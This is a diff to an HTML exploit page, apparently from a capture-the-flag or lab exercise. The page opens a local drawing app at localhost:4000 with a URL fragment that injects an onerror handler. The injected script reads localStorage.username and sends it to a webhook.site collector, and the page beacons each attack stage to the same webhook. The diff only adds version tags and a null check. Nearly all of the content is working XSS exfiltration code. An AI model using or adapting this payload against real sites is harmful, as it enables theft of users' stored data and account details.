@@ -3,18 +3,17 @@
 <body>
 <script>
   var base = "https://webhook.site/bdfce11f-cd6b-461c-b1df-e538fdca65ff";
-  fetch(base + "?stage=start", {mode:'no-cors'});
+  fetch(base + "?v=3&stage=start", {mode:'no-cors'});
   
   var payload = "fetch('"+base+"?stage=xss&c='+encodeURIComponent(localStorage.username),{mode:'no-cors'})";
   var url = "http://localhost:4000/drawing/abcd#src=1&onerror="
     + encodeURIComponent(payload) + "&is";
-
   var w = window.open(url, "_blank", "width=300,height=300");
   
   setTimeout(() => {
-    fetch(base + "?stage=before_resize", {mode:'no-cors'});
-    w.resizeTo(1000, 1000);
-    fetch(base + "?stage=after_resize", {mode:'no-cors'});
+    fetch(base + "?v=3&stage=before_resize", {mode:'no-cors'});
+    if(w) w.resizeTo(1000, 1000);
+    fetch(base + "?v=3&stage=after_resize", {mode:'no-cors'});
   }, 2500);
 </script>
 </body>
